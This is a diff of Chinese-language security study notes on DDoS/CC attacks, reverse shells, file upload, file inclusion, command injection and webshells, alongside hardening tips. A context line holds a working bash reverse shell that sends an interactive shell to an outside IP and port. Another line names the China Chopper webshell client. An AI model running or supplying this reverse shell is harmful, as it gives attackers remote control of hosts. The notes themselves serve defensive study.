@@ -4,9 +4,14 @@ cc攻击：
 ddos：流量攻击，cdn，封ip，验证码
 反弹：python -c 'import pty; pty.spawn("/bin/bash")'
       exec 9<> /dev/tcp/207.148.84.102/8008;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;^Mno
-	  将相关依赖去除/别名 /exec/curl/wget/tty模块..
+	  将相关依赖去除/别名 /exec/curl/wget/tty/socket,subprocess模块..
 计划任务    家目录     passwd/shadow   --- i权限
 
+文件上传限制/检查
+程序的解析原理：
+url的post暴力尝试，根据报错推测   # 不使用通用的url路径(admin)和数据库的库名(admin)，提高密码复杂度，不允许多次尝试和错误页面处理
+文件包含include/命令注入:将所包含的文件变成url传入参数(例如日志记录了攻击语句/图片)使其执行
+菜刀：用来连接shell的工具（命令执行）    webshell：访问url获取目标主机的目录结构（上传文件）
 
 异常用户
   /etc/passwd
